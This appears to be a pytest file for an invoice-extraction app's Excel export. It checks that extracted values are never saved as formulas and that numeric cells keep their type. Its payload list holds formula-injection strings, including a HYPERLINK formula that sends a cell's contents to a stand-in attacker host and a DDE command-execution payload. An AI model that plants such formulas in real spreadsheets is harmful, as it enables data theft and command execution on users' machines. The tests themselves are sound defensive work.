import io

import pytest
from openpyxl import load_workbook

from app.extraction.export import to_xlsx
from app.extraction.schema import INVOICE

PAYLOADS = [
    '=HYPERLINK("https://evil.example/?d="&B2,"Click to verify")',
    "=cmd|' /C calc'!A0",
    "+SUM(1+1)",
    "-2+3",
    "@SUM(1)",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_document_values_are_never_written_as_formulas(payload):
    values = {"vendor_name": payload, "invoice_number": payload, "total": 100.0}
    sheet = load_workbook(io.BytesIO(to_xlsx(INVOICE, [(payload, values, None)]))).active
    for cell in sheet[2]:
        assert cell.data_type != "f", f"{cell.coordinate} became a formula"
    assert sheet["A2"].value == payload  # kept verbatim as text, nothing silently altered


def test_numbers_and_dates_stay_typed():
    values = {"vendor_name": "Acme", "invoice_date": "2026-09-05", "total": 1180.0}
    sheet = load_workbook(io.BytesIO(to_xlsx(INVOICE, [("a.pdf", values, None)]))).active
    total_col = [s.key for s in INVOICE.fields].index("total") + 1
    assert sheet.cell(2, total_col).data_type == "n"
